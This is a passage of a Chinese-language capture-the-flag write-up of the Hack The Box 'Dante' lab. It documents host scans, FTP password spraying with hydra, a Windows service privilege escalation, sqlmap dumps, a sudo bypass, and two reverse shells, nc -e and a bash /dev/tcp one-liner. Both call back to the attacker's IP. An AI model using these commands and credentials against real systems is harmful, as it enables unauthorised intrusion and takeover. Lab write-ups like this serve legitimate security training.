class="line">[2.0s]     开始主机扫描</span><br><span class="line">[2.0s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                               </span><br><span class="line">[2.0s] [*] 目标 172.16.2.101    存活 (ICMP)</span><br><span class="line">[2.0s] [*] 目标 172.16.2.5      存活 (ICMP)</span><br><span class="line">[2.0s] [*] 目标 172.16.2.6      存活 (ICMP)</span><br><span class="line">[5.0s]     存活主机数量: 3</span><br><span class="line">[5.0s]     有效端口数量: 233</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.101:22</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.5:135</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.5:88</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.5:445</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.5:139</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.5:389</span><br><span class="line">[5.0s] [*] 端口开放 172.16.2.6:22</span><br><span class="line">[8.0s]     扫描完成, 发现 7 个开放端口</span><br><span class="line">[8.0s]     存活端口数量: 7</span><br><span class="line">[8.0s]     开始漏洞扫描</span><br><span class="line">[8.1s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="line">[8.1s] [*] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.16.2.5                                                   </span><br><span class="line">主机名: DANTE-DC02                                                    </span><br><span class="line">发现的网络接口:                                                        </span><br><span class="line">   IPv4地址:    </span><br><span class="line">      └─ 172.16.2.5    </span><br><span class="line">[8.1s] [+] NetBios 172.16.2.5      DC:DANTE\DANTE-DC02        </span><br><span class="line">[52.4s]     扫描已完成: 11/11</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(52, 52, 60);">发现还有一台2.6</font></p>
+<h2 id="Linux-172-16-2-6"><a href="#Linux-172-16-2-6" class="headerlink" title="Linux:172.16.2.6"></a><font style="color:rgb(52, 52, 60);">Linux:172.16.2.6</font></h2><p>22端口</p>
+<p>在DC02的shell里直接ssh</p>
+<p>用户密码是元购表里的plongbottom:PowerfixSaturdayClub777</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-074.png"></p>
+<p>直接sudo su提权</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-075.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-076.png"></p>
+<p>flag12：DANTE{Alw4ys_check_th053_group5}</p>
+<h2 id="Windows：172-16-1-101"><a href="#Windows：172-16-1-101" class="headerlink" title="Windows：172.16.1.101"></a>Windows：172.16.1.101</h2><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.101</font></th>
+<th><font style="color:rgb(15, 17, 21);">DANTE-WS02</font></th>
+<th><font style="color:rgb(15, 17, 21);">21, 135, 139, 445</font></th>
+<th><font style="color:rgb(15, 17, 21);">SmbGhost (CVE-2020-0796)</font><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">漏洞</font></th>
+</tr>
+</thead>
+</table>
+<p> CVE-2020-0796  </p>
+<p>msf use exploit&#x2F;windows&#x2F;smb&#x2F;cve_2020_0796_smbghost 不稳定</p>
+<p>21：hydra 爆破，一对一对撞（-C 参数）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">asmith:Princess1</span><br><span class="line">smoggat:Summer2019</span><br><span class="line">tmodle:P45678!</span><br><span class="line">ccraven:Password1</span><br><span class="line">kploty:Teacher65</span><br><span class="line">jbercov:4567Holiday1</span><br><span class="line">whaguey:acb123</span><br><span class="line">dcamtan:WorldOfWarcraft67</span><br><span class="line">tspadly:RopeBlackfieldForwardslash</span><br><span class="line">ematlis:JuneJuly1TY</span><br><span class="line">fglacdon:FinalFantasy7</span><br><span class="line">tmentrso:65RedBalloons</span><br><span class="line">dharding:WestminsterOrange5</span><br><span class="line">smillar:MarksAndSparks91</span><br><span class="line">bjohnston:Bullingdon1</span><br><span class="line">iahmed:Sheffield23</span><br><span class="line">plongbottom:PowerfixSaturdayClub777</span><br><span class="line">jcarrot:Tanenbaum0001</span><br><span class="line">lgesley:SuperStrongCantForget123456789</span><br></pre></td></tr></table></figure>
+
+<p>hydra -C hydra.txt 172.16.1.101 ftp -V</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-077.png"></p>
+<p>login: dharding   password: WestminsterOrange5</p>
+<p>登录</p>
+<p>Remote login.txt</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-078.png"></p>
+<ul>
+<li><strong>账号</strong>：<code>dido</code></li>
+<li><strong>密码规则</strong>：和 FTP 密码差不多，只是把数字 <strong>5 换成了其他数字</strong>（不是 5）</li>
+</ul>
+<p>不是这台的，先放着</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-079.png"></p>
+<p>直接登录dharding</p>
+<p>proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-080.png"></p>
+<p>flag13：DANTE{superB4d_p4ssw0rd_FTW}</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-081.png"></p>
+<p><font style="background-color:#FBDE28;">提权：</font></p>
+<p>试了土豆，不行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-082.png"></p>
+<p><strong>IObitUnSvr</strong>  <font style="color:rgba(0, 0, 0, 0.95);">IObit 卸载服务程序</font></p>
+<p><font style="background-color:#FBDE28;">IObitUnSvr 服务提权:</font><br><font style="color:#DF2A3F;">服务以 LocalSystem 运行但 ImagePath 为空，且 dharding 对该服务有注册表写权限（SDDL 中的 WP 位）</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.95);">写注册表把服务路径改成添加管理员:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config IObitUnSvr binPath= &quot;C:\Windows\System32\cmd.exe /c net localgroup administrators dharding /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.95);">启动服务（以SYSTEM执行上述命令）</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start IObitUnSvr</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.95);">服务启动”超时”报错（cmd不是长期运行的服务进程），但命令已执行——dharding 被加入 Administrators 组。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.95);">权限生效</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.95);">当前 Evil-WinRM session 仍是中等完整性令牌，需重新连接刷新：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.95);">重连后拿到 High Mandatory Level，Administrator 权限确认</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-083.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-084.png"></p>
+<p>flag14:DANTE{Qu0t3_I_4M_secure!_unQu0t3}</p>
+<h2 id="windows-172-16-1-5"><a href="#windows-172-16-1-5" class="headerlink" title="windows:172.16.1.5  "></a><font style="color:rgba(0, 0, 0, 0.95);">windows:172.16.1.5  </font></h2><p><font style="color:rgba(0, 0, 0, 0.95);"> proxychains ftp 172.16.1.5  </font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-085.png"></p>
+<p>flag15:DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}</p>
+<h2 id="Linux：172-16-1-12"><a href="#Linux：172-16-1-12" class="headerlink" title="Linux：172.16.1.12"></a>Linux：172.16.1.12</h2><p> XAMPP  </p>
+<table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.12</font></th>
+<th>DANTE-NIX04</th>
+<th><font style="color:rgb(15, 17, 21);">21, 22, 80, 443, 3306</font></th>
+<th><font style="color:rgb(15, 17, 21);">运行 XAMPP</font></th>
+</tr>
+</thead>
+</table>
+<p><a target="_blank" rel="noopener" href="https://172.16.1.12/blog/">https://172.16.1.12/blog/</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-086.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-087.png"></p>
+<p>可注册登录。先注册一个用户</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-088.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-089.png"></p>
+<p>尝试写码，不行，没权限</p>
+<p>有3306端口，找到sql注入点</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-090.png"></p>
+<p>sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &#x27;https://172.16.1.12/blog/category.php?id=1&#x27; --dbs --batch --proxy socks5://localhost:1080 </span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-091.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; -D flag --dump</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-092.png"></p>
+<p>flag16:DANTE{wHy_y0U_n0_s3cURe?!?!}</p>
+<p> blog_admin_db  :</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-093.png"></p>
+<p><code>membership_userpermissions</code> 权限表  :</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-094.png"></p>
+<p><code>membership_users</code> 表  :</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-095.png"></p>
+<p>admin的哈希</p>
+<p> 账号：admin 密码：admin  （好一个弱口令，我竟然没测😂）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-096.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-097.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-098.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-099.png"></p>
+<p>信息：</p>
+<p> ben 的 md5：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">442179ad1de9c25593cabf625c0badb7</span><br></pre></td></tr></table></figure>
+
+<p> egre55   的 md5 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d6501933a2e0ea1f497b87473051417f</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-100.png"></p>
+<p>解一下：</p>
+<p>ben :Welcometomyblog</p>
+<p> SSH 登录 ben</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-101.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-102.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-103.png"></p>
+<p>flag12:DANTE{Pretty_Horrific_PH4IL!}</p>
+<p>sudo -l:</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-104.png"></p>
+<p>看到<font style="color:rgb(0, 0, 0);">(ALL, !root) &#x2F;bin&#x2F;bash，</font><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2019-14287 sudo 权限绕过漏洞</font></strong></p>
+<p>**<font style="background-color:#FBDE28;">sudo -u#-1 &#x2F;bin&#x2F;bash</font>**直接提 Root</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-105.png"></p>
+<p>flag17:DANTE{sudo_M4k3_me_@_Sandwich}</p>
+<h2 id="Windows-172-16-1-102"><a href="#Windows-172-16-1-102" class="headerlink" title="Windows: 172.16.1.102"></a>Windows: 172.16.1.102</h2><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.102</font></th>
+<th><font style="color:rgb(15, 17, 21);">DANTE-WS03</font></th>
+<th><font style="color:rgb(15, 17, 21);">80, 135, 139, 443, 445, 3306</font></th>
+<th><font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行“Dante Marriage Registration System”</font></th>
+</tr>
+</thead>
+</table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-106.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-107.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-108.png"></p>
+<p>登不进去</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-109.png"></p>
+<p>Online Marriage Registration System 2020</p>
+<p>找洞，还真有exp   OMRS</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-110.png"></p>
+<p><strong><font style="background-color:#FBDE28;">漏洞利用总结：</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">漏洞链（未授权 → RCE）</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未授权访问 → 注册普通用户 → 登录 → 婚姻登记表单上传证件 → 无文件校验 → 上传 PHP webshell → 命令执行</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">漏洞本质：</font><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 上传处无文件类型 &#x2F; 后缀校验，直接传 </font></strong><code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;.php&lt;/font&gt;</code><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 不会被拦截  </font></strong></p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机开监听</span><br><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">#上传nc</span><br><span class="line">proxychains python3 omrs.py -u http://172.16.1.102/ -c &#x27;powershell.exe wget 10.10.16.59:8000/nc.exe -O nc.exe&#x27;</span><br><span class="line"># 目标反弹</span><br><span class="line">proxychains python3 omrs.py -u http://172.16.1.102/ -c &#x27;nc.exe -e powershell.exe 10.10.16.59 9001&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>上传nc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-111.png"></p>
+<p>上传成功</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-112.png"></p>
+<p>弹shell</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-113.png"></p>
+<p>拿到shell</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-114.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-115.png"></p>
+<p>flag18：DANTE{U_M4y_Kiss_Th3_Br1d3}</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-116.png"></p>
+<p>提权：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-117.png"></p>
+<p>土豆：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-118.png"></p>
+<p>拿到system,直接读flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-119.png"></p>
+<p>flag19：DANTE{D0nt_M3ss_With_MinatoTW}</p>
+<h2 id="Linux：172-16-1-19"><a href="#Linux：172-16-1-19" class="headerlink" title="Linux：172.16.1.19"></a>Linux：172.16.1.19</h2><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.19</font></th>
+<th>DANTE-NIX07</th>
+<th><font style="color:rgb(15, 17, 21);">80, 8080</font></th>
+</tr>
+</thead>
+</table>
+<p>8080：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-120.png"></p>
+<p>之前DC02找到一个Jenkins.bat</p>
+<p>Admin_129834765 SamsungOctober102030</p>
+<p>登录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-121.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-122.png"></p>
+<p>直接给flag了</p>
+<p>flag20：DANTE{to_g0_4ward_y0u_mus7_g0_back}</p>
+<p>现在要拿shell,常见漏洞在Groovy 脚本控制台  </p>
+<p>&#x2F;script</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-123.png"></p>
+<p>直接命令执行输出到页面上</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-124.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-125.png"></p>
+<p>hostname: DANTE-NIX07</p>
+<p>etc&#x2F;passwd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">whoopsie:x:120:125::/nonexistent:/bin/false</span><br><span class="line">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">lou:x:1000:1000:lou,,,:/home/lou:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">jenkins:x:126:133:Jenkins,,,:/var/lib/jenkins:/bin/bash</span><br><span class="line">mysql:x:127:135:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ian:x:1001:1001:,,,:/home/ian:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>有用户 lou  ，ian</p>
+<p>直接弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def cmd = [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.59/9002 0&gt;&amp;1&quot;].execute()</span><br><span class="line">println(&quot;Shell sent!&quot;)</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-126.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-127.png"></p>
+<p>提权：</p>
+<p>sudo等提权都不行</p>
+<p>用 linpeas.sh 扫一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-128.png"></p>
+<p>有mysql,但是没扫到端口之前，也没找到密码</p>
+<p> LinPEAS 扫出来有 <strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2021-3493（Ubuntu OverlayFS）</font></strong> 提权漏洞  </p>
+<blockquote>
+<p><font style="color:rgb(52, 52, 60);">😭</font><font style="color:rgb(52, 52, 60);">第二天起来发现入口机wordpress的Plugin因之前写</font><font style="color:rgb(52, 52, 60);">🐎</font><font style="color:rgb(52, 52, 60);">，都被杀了，新建新的也不行，找别的写</font><font style="color:rgb(52, 52, 60);">🐎</font><font style="color:rgb(52, 52, 60);">的地方也不行，参考wp打历史漏洞也不行，试试让agent直接帮我打。直接给我打出来了</font><font style="color:rgb(52, 52, 60);">😍</font><font style="color:rgb(52, 52, 60);">，直接rce且弹了shell。但是他老被杀，有没有什么解决方法呢？</font></p>
+</blockquote>
+<p><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2021-3493 OverlayFS</font></strong><font style="color:rgb(52, 52, 60);"> 提权：</font></p>
+<p><font style="color:rgb(52, 52, 60);">Kali编译(静态链接) → HTTP服务 → Jenkins wget下载 → 执行 → root</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O /tmp/exploit.c 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -o /tmp/exploit /tmp/exploit.c &amp;&amp; echo &quot;STATIC OK&quot;</span><br></pre></td></tr></table></figure>
+
+<p>关键点：Kali上必须静态编译（gcc -static），因为.19的glibc版本低于Kali的2.34</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Kali上编译+开HTTP</span><br><span class="line">gcc -static -o /tmp/exploit /tmp/exploit.c</span><br><span class="line">cd /tmp &amp;&amp; python3 -m http.server 8999</span><br><span class="line"></span><br><span class="line"># .19上下载+执行</span><br><span class="line">wget http://10.10.16.59:8999/exploit -O /tmp/exploit</span><br><span class="line">chmod +x /tmp/exploit</span><br><span class="line">/tmp/exploit</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-129.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-130.png"></p>
+<p>flag21:DANTE{g0tta_&lt;3_ins3cur3_GROupz!}</p>
+<h2 id="Windows-：172-16-1-13"><a href="#Windows-：172-16-1-13" class="headerlink" title="Windows ：172.16.1.13"></a><font style="color:#DF2A3F;">Windows ：172.16.1.13</font></h2><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.13</font></th>
+<th><font style="color:rgb(15, 17, 21);">DANTE-WS01</font></th>
+<th><font style="color:rgb(15, 17, 21);">80, 443, 445</font></th>
+<th><font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行 XAMPP</font></th>
+</tr>
+</thead>
+</table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-131.png"></p>
+<p>扫目录：</p>
+<p>有phpmyadmin，但是不能访问</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-132.png"></p>
+<p>&#x2F;discuss</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-133.png"></p>
+<p>&#x2F;discuss&#x2F;db&#x2F;有个sql文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-134.png"></p>
+<p>admin、admin登录，管理员，但没东西，john 12345 也能登录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-135.png"></p>
+<p>头像文件上传</p>
+<!-- 这是一张图片，ocr 内容为： -->
